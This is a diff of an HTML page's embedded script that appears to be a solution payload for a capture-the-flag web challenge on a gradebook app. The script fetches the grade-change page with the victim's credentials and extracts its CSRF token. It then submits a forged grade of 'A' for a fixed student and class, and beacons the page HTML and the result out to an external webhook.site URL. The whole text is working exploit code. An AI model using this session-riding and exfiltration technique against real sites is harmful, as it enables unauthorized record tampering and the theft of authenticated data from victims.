@@ -3,53 +3,54 @@
 <body>
     <script>
         function sendToWebhook(data) {
-            // Encode data in URL parameters and use image tag to avoid CORS
+            // Use image tag (allowed by img-src *)
             const params = new URLSearchParams();
             params.append('data', JSON.stringify(data));
             new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
         }
 
-        // Send initial message
-        sendToWebhook({
-            message: 'Starting fetch of /grade-change',
-            timestamp: new Date().toISOString()
-        });
-
-        // Fetch the grade-change endpoint
+        // First, fetch the grade-change page to get CSRF token
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
-            credentials: 'include',
-            mode: 'same-origin'
+            credentials: 'include'
         })
-        .then(response => {
-            // Send response metadata first
-            sendToWebhook({
-                type: 'response_headers',
-                status: response.status,
-                statusText: response.statusText,
-                url: response.url,
-                redirected: response.redirected,
-                timestamp: new Date().toISOString()
-            });
-            
-            return response.text();
-        })
+        .then(response => response.text())
         .then(html => {
-            // Send the COMPLETE HTML content
+            // Send HTML to webhook via image
             sendToWebhook({
-                type: 'full_html',
+                type: 'grade_change_html',
                 html: html,
-                length: html.length,
-                timestamp: new Date().toISOString()
+                length: html.length
+            });
+
+            // Extract CSRF token and submit grade change
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
+
+            const formData = new FormData();
+            formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
+            formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
+            formData.append('grade', 'A');
+            formData.append('csrf_token', csrfToken);
+
+            // Submit grade change (same-origin - allowed)
+            return fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
+                method: 'POST',
+                body: formData,
+                credentials: 'include'
+            });
+        })
+        .then(response => response.text())
+        .then(result => {
+            sendToWebhook({
+                type: 'grade_change_result',
+                result: result
             });
         })
         .catch(error => {
-            // Send error details
             sendToWebhook({
                 type: 'error',
-                error: error.toString(),
-                errorName: error.name,
-                errorMessage: error.message,
-                timestamp: new Date().toISOString()
+                error: error.toString()
             });
         });
     </script>
